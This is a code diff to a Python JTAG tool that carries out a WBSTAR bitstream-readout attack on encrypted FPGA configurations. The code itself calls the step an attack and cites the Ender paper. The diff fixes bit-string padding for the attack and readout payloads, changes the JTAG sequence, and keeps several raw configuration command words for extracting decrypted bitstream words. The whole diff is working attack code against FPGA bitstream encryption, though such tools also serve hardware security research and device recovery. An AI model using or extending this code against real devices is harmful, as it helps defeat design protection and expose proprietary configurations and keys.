@@ -71,6 +71,15 @@ nky_iv = ''
 nky_hmac =''
 use_fuzzer = False
 
+from math import log
+def bytes_needed(n):
+    if n == 0:
+        return 1
+    return int(log(n, 256))+1
+
+def int_to_binstr(n):
+    return bin(n)[2:].zfill(bytes_needed(n)*8)
+
 def phy_sync(tdi, tms):
     global TCK_pin, TMS_pin, TDI_pin, TDO_pin
 
@@ -375,7 +384,7 @@ def do_bitstream(ifile):
                 break
             position = position + 1
 
-        config_data = bin(int.from_bytes(binfile[position:], byteorder='big'))[2:]
+        config_data = int_to_binstr(int.from_bytes(binfile[position:], byteorder='big'))
         
         jtag_legs.append([JtagLeg.RS, '0', 'reset'])
         jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
@@ -508,7 +517,7 @@ def do_wbstar(ifile, offset):
                   with open("check{}.bin".format(word_index), "wb") as check:
                       check.write(attack_area)
               # run the attack
-              attack_bits = bin(int.from_bytes(attack_area, byteorder='big'))[2:]
+              attack_bits = int_to_binstr(int.from_bytes(attack_area, byteorder='big'))
               jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
               jtag_legs.append([JtagLeg.DR, '00000000000000000000000000000000', ' '])
               jtag_legs.append([JtagLeg.IR, '001011', 'jprogram'])
@@ -517,9 +526,9 @@ def do_wbstar(ifile, offset):
               jtag_legs.append([JtagLeg.RS, '0', 'reset'])
               jtag_legs.append([JtagLeg.IRD, '000101', 'cfg_in'])
               jtag_legs.append([JtagLeg.DRC, attack_bits, 'attack_data'])
-              jtag_legs.append([JtagLeg.RS, '0', 'reset'])
-              jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
-              jtag_legs.append([JtagLeg.DR, '00000000000000000000000000000000', ' '])
+              #jtag_legs.append([JtagLeg.RS, '0', 'reset'])
+              #jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
+              #jtag_legs.append([JtagLeg.DR, '00000000000000000000000000000000', ' '])
 
               while len(jtag_legs):
                  jtag_next()
@@ -589,7 +598,7 @@ def do_wbstar(ifile, offset):
                            ro_area[i] = b
                            i = i + 1
 
-                       readout_cmd = bin(int.from_bytes(ro_area, byteorder='big'))[2:]
+                       readout_cmd = int_to_binstr(int.from_bytes(ro_area, byteorder='big'))
                        i = 0
                        if debug:
                            for b in ro_area:
@@ -626,14 +635,18 @@ def do_wbstar(ifile, offset):
 
               else:
                   ### preferred command
-                  readout_cmd = bin(0xaa99556620000000280200012000000020000000)[2:]
+                  readout_cmd = 0xaa99556620000000280200012000000020000000
+                  ### induse soft reset + iprog to recover WBSTAR via pins
+                  #readout_cmd = 0xffffffffaa99556620000000280200012000000020000000300080010000000f20000000
+                  #readout_cmd = 0xffffffffaa9955662000000030020001e000000028020001300080010000000f20000000
                   ### command as from Ender paper
-                  # readout_cmd = bin(0xffffffffffffffffffffffffffffffffffffffffffffffff000000bb11220044ffffffffffffffffaa9955662000000030008001000000042000000020000000200000002802000120000000200000002000000020000000)[2:]
-
+                  # readout_cmd = 0xffffffffffffffffffffffffffffffffffffffffffffffff000000bb11220044ffffffffffffffffaa9955662000000030008001000000042000000020000000200000002802000120000000200000002000000020000000
+                  
                   # now perform the readout
                   jtag_legs.append([JtagLeg.RS, '0', 'reset'])
                   jtag_legs.append([JtagLeg.IRD, '000101', 'cfg_in'])
-                  jtag_legs.append([JtagLeg.DRC, readout_cmd, 'readout_command'])
+                  jtag_legs.append([JtagLeg.DRC, int_to_binstr(readout_cmd), 'readout_command'])
+                  jtag_legs.append([JtagLeg.DL, '0', 'delay'])
                   jtag_legs.append([JtagLeg.IR, '000100', 'cfg_out'])
                   jtag_legs.append([JtagLeg.DRR, '00000000000000000000000000000000', 'readout'])
                   jtag_legs.append([JtagLeg.RS, '0', 'reset'])
@@ -642,7 +655,8 @@ def do_wbstar(ifile, offset):
                   while len(jtag_legs):
                      jtag_next()
 
-                  print("Recovered word at {}: {}".format(ro_fuzz, hex(int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big'))))
+                  # print("Recovered word: {}".format(hex(int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big'))))
+                  # input("Press enter to continue...")
                   logging.debug("Recovered word: %s", hex(int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big')))
                   recovered[3-word_index] = readdata
                   block[3-word_index] = int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big')
